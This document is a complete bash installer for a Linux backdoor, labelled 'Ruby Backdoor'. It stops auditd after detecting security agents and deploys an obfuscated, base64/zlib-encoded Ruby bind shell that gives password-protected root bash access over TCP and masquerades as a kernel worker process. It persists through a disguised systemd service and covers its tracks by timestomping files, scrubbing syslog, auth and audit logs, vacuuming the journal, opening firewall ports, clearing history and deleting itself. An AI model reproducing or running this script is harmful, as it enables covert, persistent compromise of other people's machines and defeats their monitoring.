#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

ST_NAME="dbus-org-maintenance"
ST_SCRIPT="node_headers.rb"
RUBY_SCRIPT_PATH="/usr/local/include/$ST_SCRIPT"
SERVICE_PATH="/etc/systemd/system/$ST_NAME.service"
SERVER_IP=$(hostname -I | awk '{print $1}')

echo -e "${GREEN}"
cat << "BANNER"
    __ __      __           __  
   / //_/___ _/ /___ ______/ /_ 
  / ,< / __ `/ / __ `/ ___/ __ \
 / /| / /_/ / / /_/ (__  ) / / /
/_/ |_\__,_/_/\__,_/____/_/ /_/ 
                      Ruby Backdoor
BANNER
echo -e "${NC}"

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[ERROR] This script must be run as root.${NC}"
  exit 1
fi

check_security() {
    echo -e "${YELLOW}[...] Checking Environment...${NC}"
    SECURITY_PROCS=("falconctl" "s1-agent" "ossec-agent" "wazuh-agent" "sysmon" "carbonblack" "qualys-agent" "auditd")
    FOUND_SEC=()
    for proc in "${SECURITY_PROCS[@]}"; do
        if pgrep -f "$proc" > /dev/null 2>&1 || [ -f "/usr/bin/$proc" ]; then
            FOUND_SEC+=("$proc")
        fi
    done

    if [ ${#FOUND_SEC[@]} -gt 0 ]; then
        echo -e "${RED}[WARNING] Security software detected: ${FOUND_SEC[*]}${NC}"
        if [[ " ${FOUND_SEC[*]} " =~ " auditd " ]]; then
            service auditd stop > /dev/null 2>&1
            systemctl stop auditd > /dev/null 2>&1
        fi
        read -p "Proceed anyway? (y/N): " choice
        [[ ! "$choice" =~ ^[Yy]$ ]] && exit 1
    fi
}

check_security

read -p "Enter Port: " PORT
read -s -p "Enter Password: " PASSWORD
echo

print_step() { echo -e "${YELLOW}[...]${NC} $1"; }
print_log() { echo -e "${GREEN}[OK]${NC} $1"; }

print_step "Installing dependencies..."
apt-get update > /dev/null 2>&1
apt-get install -y ruby > /dev/null 2>&1

print_step "Generating Obfuscated Payload..."

RAW_CODE=$(cat << EOF
require 'socket'
require 'zlib'
\$0 = "[kworker/u2:1]"
Process.setproctitle("[kworker/u2:1]") rescue nil
begin
  server = TCPServer.new('0.0.0.0', $PORT)
  loop do
    Thread.start(server.accept) do |client|
      begin
        client.puts "Welcome. Enter password:"
        input = client.gets.chomp
        if input != "$PASSWORD" then client.close; next; end
        client.puts "Access granted."
        IO.popen("/bin/bash -i", "r+") do |shell|
          Thread.new { loop { cmd = client.gets; break unless cmd; shell.puts(cmd); shell.flush } }
          loop { out = shell.gets; break unless out; client.puts(out) }
        end
      rescue; nil; ensure; client.close if client; end
    end
  end
rescue; exit 0; end
EOF
)

ENCODED_PAYLOAD=$(echo "$RAW_CODE" | ruby -e "require 'zlib'; require 'base64'; puts Base64.strict_encode64(Zlib::Deflate.deflate(ARGF.read))")

cat > "$RUBY_SCRIPT_PATH" << EOF
#!/usr/bin/env ruby
require 'zlib';require 'base64';eval(Zlib::Inflate.inflate(Base64.decode64("$ENCODED_PAYLOAD")))
EOF

chmod +x "$RUBY_SCRIPT_PATH"
touch -t 202105121030 "$RUBY_SCRIPT_PATH"

print_step "Configuring Persistence..."
cat > "$SERVICE_PATH" << EOF
[Unit]
Description=DBus System Maintenance Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/ruby $RUBY_SCRIPT_PATH
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

touch -t 202105121032 "$SERVICE_PATH"
systemctl daemon-reload > /dev/null 2>&1
systemctl enable $ST_NAME.service > /dev/null 2>&1
systemctl start $ST_NAME.service > /dev/null 2>&1

mkdir -p /etc/systemd/system/$ST_NAME.service.d
echo -e "[Unit]\nDescription=" > /etc/systemd/system/$ST_NAME.service.d/hide.conf
systemctl daemon-reload > /dev/null 2>&1

LOG_FILES=("/var/log/syslog" "/var/log/auth.log" "/var/log/daemon.log" "/var/log/audit/audit.log")
for log in "${LOG_FILES[@]}"; do
  [ -f "$log" ] && sed -i "/$ST_NAME\|${ST_SCRIPT%.*}\|$PORT/d" "$log"
done
journalctl --vacuum-time=1s > /dev/null 2>&1

if command -v ufw > /dev/null 2>&1; then
  ufw allow $PORT/tcp > /dev/null 2>&1
fi
iptables -I INPUT -p tcp --dport $PORT -j ACCEPT > /dev/null 2>&1

echo -e "\n${GREEN}====================================================${NC}"
echo -e "Status: ${GREEN}STEALTH & OBFUSCATED ACTIVE${NC}"
echo -e "Masquerade: ${YELLOW}[kworker/u2:1]${NC}"
echo -e "Connection: ${YELLOW}nc $SERVER_IP $PORT${NC}"
echo -e "${GREEN}====================================================${NC}"

history -c
rm -- "$0"
